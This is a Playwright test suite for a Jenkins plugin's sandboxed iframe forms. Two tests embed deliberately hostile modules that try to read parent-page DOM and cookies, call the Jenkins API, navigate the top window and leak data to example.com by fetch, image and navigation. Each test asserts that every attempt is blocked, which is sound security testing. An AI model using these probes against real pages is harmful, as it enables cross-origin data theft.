// Sandboxed forms (sandbox: true): the form's code runs in <iframe sandbox="allow-scripts">,
// an opaque origin with no cookies, and reaches Jenkins only through the host's ui.query.
import { test, expect } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';
import { readFileSync } from 'node:fs';
import { pipelineJob, build, waitForBuild, lastNumber, consoleText, watch } from './jenkins.mjs';

const reference = readFileSync(new URL('../../examples/reference.Jenkinsfile', import.meta.url), 'utf8');
const sandboxedReference = reference.replace("name: 'BUILD_CONFIG',", "name: 'BUILD_CONFIG', sandbox: true,");

async function submit(page, request, job) {
  const next = (await lastNumber(request, job)) + 1;
  await page.getByRole('button', { name: 'Build', exact: true }).click();
  await waitForBuild(request, job, next);
  return consoleText(request, job, next);
}

/** A job with sandboxed `runtime: 'none'` forms, each given as [name, module]; echoes every value. */
function plainForms(...forms) {
  const params = forms.map(([name, module]) => `uiParameter(name: '${name}', sandbox: true, runtime: 'none', module: '''${module}''')`);
  return `pipeline { agent none
    parameters { ${params.join('\n')} }
    stages { stage('s') { steps { ${forms.map(([name]) => `echo "${name}=\${params.${name}}"`).join('; ')} } } } }`;
}

const frameOf = (page, nth = 0) => page.frameLocator('.build-ui-root iframe').nth(nth);

test('a sandboxed form runs in an opaque-origin frame under Jenkins CSP and its value reaches params', async ({ page, request }) => {
  expect(sandboxedReference).not.toBe(reference);
  await pipelineJob(request, 'sandbox-reference', sandboxedReference);
  await build(request, 'sandbox-reference');
  const problems = await watch(page);

  const res = await page.goto('job/sandbox-reference/build?delay=0sec');
  // The frame's document is srcdoc, so it inherits this page's policy.
  const csp = res.headers()['content-security-policy'];
  expect(csp, 'Jenkins must enforce its CSP on the page the frame inherits it from').toContain("script-src 'report-sample' 'self'");
  expect(csp).not.toContain('unsafe-eval');

  const iframe = page.locator('.build-ui-root iframe');
  await expect(page.locator('.build-ui-root[data-mounted="true"]')).toBeVisible();
  expect(await iframe.getAttribute('sandbox'), 'allow-same-origin would give the frame the page\'s origin back').toBe('allow-scripts');
  expect(await iframe.getAttribute('title')).toBe('BUILD_CONFIG');
  const frame = await (await iframe.elementHandle()).contentFrame();
  expect(await frame.evaluate(() => self.origin)).toBe('null');
  await expect(page.locator('textarea.build-ui-value')).toBeHidden();

  const f = frameOf(page);
  // jenkinsRuns answered through the host, with the viewer's session.
  await expect(f.locator('.runs li').first()).toHaveText('#1 SUCCESS');
  // The form's CSS reached the frame's shadow root.
  expect(await f.locator('fieldset').first().evaluate((el) => getComputedStyle(el).borderTopLeftRadius)).toBe('6px');
  await f.locator('input[name="branch"]').fill('release/1.2');
  await f.locator('input[name="worker"]').check();
  await f.locator('input[name="deploy"]').check();
  await f.locator('select[name="env"]').selectOption('staging');

  const log = await submit(page, request, 'sandbox-reference');
  expect(log).toContain('BUILD_CONFIG={"branch":"release/1.2","services":["api","worker"],"deploy":true,"env":"staging"}');
  expect(problems, problems.join('\n')).toEqual([]);
});

test('a hostile sandboxed module cannot read the page or cookies, call the Jenkins API or navigate the page', async ({ page, request, baseURL, browserName }) => {
  await pipelineJob(request, 'sandbox-hostile', plainForms(['CFG', `
export default async function mount({ root, ui }) {
  const report = {}
  const attempt = async (name, fn) => {
    try { await fn(); report[name] = "succeeded" } catch (e) { report[name] = "failed: " + e.name }
  }
  await attempt("parentDom", () => parent.document.body.innerHTML)
  try { report.cookie = "read " + JSON.stringify(document.cookie) } catch (e) { report.cookie = "failed: " + e.name }
  // The module's URL is <jenkins>/build-ui-sandbox/module/<token>.mjs.
  const jenkins = new URL("../../", import.meta.url).href
  await attempt("api", async () => { const r = await fetch(jenkins + "api/json"); await r.text() })
  await attempt("top", () => { top.location.href = jenkins })
  // Jenkins's CSP holds inside the frame: an inline script does not run.
  const inline = document.createElement("script")
  inline.textContent = "window.inlineRan = true"
  document.head.append(inline)
  report.inlineScript = window.inlineRan === true ? "ran" : "blocked"
  ui.setValue(report)
  // The host listens only to its MessagePort, so a message to the page window must change nothing.
  parent.postMessage({ type: "setValue", json: JSON.stringify({ forged: true }) }, "*")
  setTimeout(() => { root.textContent = "done" }, 300)
}`]));
  await build(request, 'sandbox-hostile');
  // A cookie page scripts may read, so an empty answer in the frame means it has no access.
  await page.context().addCookies([{ name: 'buildui-visible', value: '1', domain: new URL(baseURL).hostname, path: '/' }]);
  await page.goto('job/sandbox-hostile/build?delay=0sec');
  expect(await page.evaluate(() => document.cookie)).toContain('buildui-visible=1');
  await expect(frameOf(page).locator('body')).toContainText('done');

  const report = JSON.parse(await page.locator('textarea.build-ui-value').inputValue());
  expect(report).toEqual({
    parentDom: 'failed: SecurityError',
    // Chromium and Firefox throw; WebKit answers an empty string to a sandboxed srcdoc frame.
    cookie: browserName === 'webkit' ? 'read ""' : 'failed: SecurityError',
    api: 'failed: TypeError', // CORS: Jenkins sends no Access-Control-Allow-Origin, and the request had no cookies
    top: 'failed: SecurityError',
    inlineScript: 'blocked',
  });
  expect(page.url()).toContain('job/sandbox-hostile/build');
});

test('Jenkins CSP keeps a sandboxed module from sending data to another host by fetch, image or frame navigation', async ({ page, request }) => {
  await pipelineJob(request, 'sandbox-leak', plainForms(['CFG', `
export default async function mount({ root, ui }) {
  const report = {}
  try { await fetch("https://example.com/?leak=fetch"); report.fetch = "succeeded" } catch (e) { report.fetch = "failed: " + e.name }
  report.image = await new Promise((resolve) => {
    const img = new Image()
    img.onload = () => resolve("loaded")
    img.onerror = () => resolve("blocked")
    img.src = "https://example.com/?leak=image"
  })
  ui.setValue(report)
  root.textContent = "done"
  setTimeout(() => { location.href = "https://example.com/?leak=navigation" }, 100)
}`]));
  await build(request, 'sandbox-leak');
  // Playwright reports the CSP-blocked image as a request that failed with "csp"; any other
  // outcome for that host means the request went out.
  const outside = [];
  page.on('response', (r) => { if (r.url().includes('example.com')) outside.push(`response ${r.url()}`); });
  page.on('requestfailed', (r) => {
    if (r.url().includes('example.com') && r.failure()?.errorText !== 'csp') outside.push(`${r.failure()?.errorText} ${r.url()}`);
  });
  await page.goto('job/sandbox-leak/build?delay=0sec');
  await expect(frameOf(page).locator('body')).toContainText('done');
  await page.waitForTimeout(1000);
  expect(JSON.parse(await page.locator('textarea.build-ui-value').inputValue())).toEqual({ fetch: 'failed: TypeError', image: 'blocked' });
  // The page's own CSP (frame-src from default-src 'self') stops the frame from navigating itself elsewhere.
  expect(outside, 'no request may leave for another host').toEqual([]);
});

test('ui.query works through the host, errors included, and the frame follows its content height', async ({ page, request }) => {
  await pipelineJob(request, 'sandbox-query', plainForms(['CFG', `
export default async function mount({ root, ui }) {
  const runs = await ui.query("jenkinsRuns", { job: ui.job, limit: 1 })
  let failure = ""
  try { await ui.query("no-such-provider") } catch (e) { failure = e.message }
  root.innerHTML = "<p class=runs></p><p class=failure></p><button type=button>Grow</button>"
  root.querySelector(".runs").textContent = "#" + runs[0].number + " " + runs[0].result
  root.querySelector(".failure").textContent = failure
  root.querySelector("button").addEventListener("click", () => {
    const tall = document.createElement("div")
    tall.className = "tall"
    tall.style.height = "600px"
    root.append(tall)
  })
}`]));
  await build(request, 'sandbox-query');
  const problems = await watch(page);
  await page.goto('job/sandbox-query/build?delay=0sec');
  const f = frameOf(page);
  await expect(f.locator('.runs')).toHaveText('#1 SUCCESS');
  await expect(f.locator('.failure')).toHaveText("unknown data provider 'no-such-provider'");

  const iframe = page.locator('.build-ui-root iframe');
  // The frame's first height message can arrive after its text renders (seen in WebKit).
  await expect.poll(async () => (await iframe.boundingBox()).height).toBeGreaterThan(30);
  const before = (await iframe.boundingBox()).height;
  await f.getByRole('button', { name: 'Grow' }).click();
  await expect.poll(async () => (await iframe.boundingBox()).height).toBeGreaterThanOrEqual(before + 600);
  const frame = await (await iframe.elementHandle()).contentFrame();
  expect(await frame.evaluate(() => document.documentElement.scrollHeight <= innerHeight), 'no scrollbar inside the frame').toBe(true);
  // The unknown provider answers 404, which Chromium logs; nothing else may.
  expect(problems.filter((p) => !p.includes('404')), problems.join('\n')).toEqual([]);
});

test('two sandboxed forms on one page each get their own frame and value', async ({ page, request }) => {
  const field = (label) => `
export default function mount({ root, ui }) {
  root.innerHTML = "<label>${label} <input></label>"
  root.querySelector("input").addEventListener("input", (e) => ui.setValue({ v: e.currentTarget.value }))
}`;
  await pipelineJob(request, 'sandbox-two', plainForms(['FIRST', field('First')], ['SECOND', field('Second')]));
  await build(request, 'sandbox-two');
  await page.goto('job/sandbox-two/build?delay=0sec');
  await expect(page.locator('.build-ui-root[data-mounted="true"]')).toHaveCount(2);
  await frameOf(page, 0).getByLabel('First').fill('one');
  await frameOf(page, 1).getByLabel('Second').fill('two');
  const log = await submit(page, request, 'sandbox-two');
  expect(log).toContain('FIRST={"v":"one"}');
  expect(log).toContain('SECOND={"v":"two"}');
});

test('a sandboxed module that throws falls back to the JSON textarea', async ({ page, request }) => {
  await pipelineJob(request, 'sandbox-broken', plainForms(['CFG', 'export default function mount() { throw new Error("boom") }']));
  await build(request, 'sandbox-broken');
  await page.goto('job/sandbox-broken/build?delay=0sec');
  await expect(page.getByRole('alert')).toContainText('boom');
  await expect(page.locator('.build-ui-root iframe')).toHaveCount(0);
  await page.locator('textarea.build-ui-value').fill('{"typed":true}');
  expect(await submit(page, request, 'sandbox-broken')).toContain('CFG={"typed":true}');
});

test('the frame takes the Jenkins theme colors from the page', async ({ page, request }) => {
  await pipelineJob(request, 'sandbox-theme', plainForms(['CFG', 'export default function mount({ root }) { root.innerHTML = "<label>Name <input></label>" }']));
  await build(request, 'sandbox-theme');
  // What a dark theme does, on the page only: the frame has to get the value from the host.
  // The host reads the theme when the frame loads, after DOMContentLoaded.
  await page.addInitScript(() => {
    if (window !== window.top) return;
    addEventListener('DOMContentLoaded', () => document.documentElement.style.setProperty('--text-color', 'rgb(230, 230, 230)'));
  });
  await page.goto('job/sandbox-theme/build?delay=0sec');
  const label = frameOf(page).locator('label');
  await expect(label).toBeVisible();
  expect(await label.evaluate((el) => getComputedStyle(el).color)).toBe('rgb(230, 230, 230)');
});

test('a sandboxed form has no axe violations, and axe does look inside the frame', async ({ page, request }) => {
  await pipelineJob(request, 'sandbox-a11y', sandboxedReference);
  await build(request, 'sandbox-a11y');
  await page.goto('job/sandbox-a11y/build?delay=0sec');
  await frameOf(page).locator('input[name="deploy"]').check();
  await expect(frameOf(page).locator('select[name="env"]')).toBeVisible();
  // axe treats the frame's document as a whole page and runs its page-level rules there. The
  // frame is a part of the Jenkins page, which has the main landmark and the h1, so they do not apply.
  const axe = async () => (await new AxeBuilder({ page }).include('.build-ui-root')
    .disableRules(['landmark-one-main', 'page-has-heading-one', 'region']).analyze()).violations.map((v) => v.id);
  expect(await axe()).toEqual([]);

  // Control: an unlabelled input inside a frame must be reported, or the empty list above proves nothing.
  await pipelineJob(request, 'sandbox-a11y-control', plainForms(['CFG', 'export default function mount({ root }) { root.innerHTML = "<input>" }']));
  await build(request, 'sandbox-a11y-control');
  await page.goto('job/sandbox-a11y-control/build?delay=0sec');
  await expect(frameOf(page).locator('input')).toBeVisible();
  expect(await axe()).toContain('label');
});

test('a sandboxed form works inside an input step', async ({ page, request }) => {
  await pipelineJob(request, 'sandbox-input', `
    def cfg = input message: 'Configure', parameters: [uiParameter(name: 'CFG', sandbox: true, runtime: 'none', defaultJson: '{"approve":false}', module: '''
export default function mount({ root, ui }) {
  root.innerHTML = "<label><input type=checkbox> Approve</label>"
  root.querySelector("input").addEventListener("change", (e) => ui.setValue({ approve: e.currentTarget.checked }))
}''')]
    echo "INPUT=\${cfg}"`);
  const n = await build(request, 'sandbox-input', { finished: false });
  await expect.poll(async () => (await consoleText(request, 'sandbox-input', n)).includes('Input requested'),
    { timeout: 60_000 }).toBe(true);
  await page.goto(`job/sandbox-input/${n}/input/`);
  await frameOf(page).getByLabel('Approve').check();
  await page.getByRole('button', { name: 'Proceed' }).click();
  await waitForBuild(request, 'sandbox-input', n);
  expect(await consoleText(request, 'sandbox-input', n)).toContain('INPUT={"approve":true}');
});

test('a sandboxed uiPanel draws on the build page from the run data', async ({ page, request }) => {
  await pipelineJob(request, 'sandbox-panel', `
    uiPanel title: 'Deploy summary', sandbox: true, runtime: 'none', data: '{"env":"staging"}',
      module: 'export default function mount({ root, ui }) { root.innerHTML = "<p class=summary></p>"; root.firstChild.textContent = "env: " + ui.value.env }'`);
  const n = await build(request, 'sandbox-panel');
  const problems = await watch(page);
  await page.goto(`job/sandbox-panel/${n}/`);
  await expect(frameOf(page).locator('p.summary')).toHaveText('env: staging');
  expect(await page.locator('.build-ui-root iframe').getAttribute('title')).toBe('Deploy summary');
  expect(problems, problems.join('\n')).toEqual([]);
});
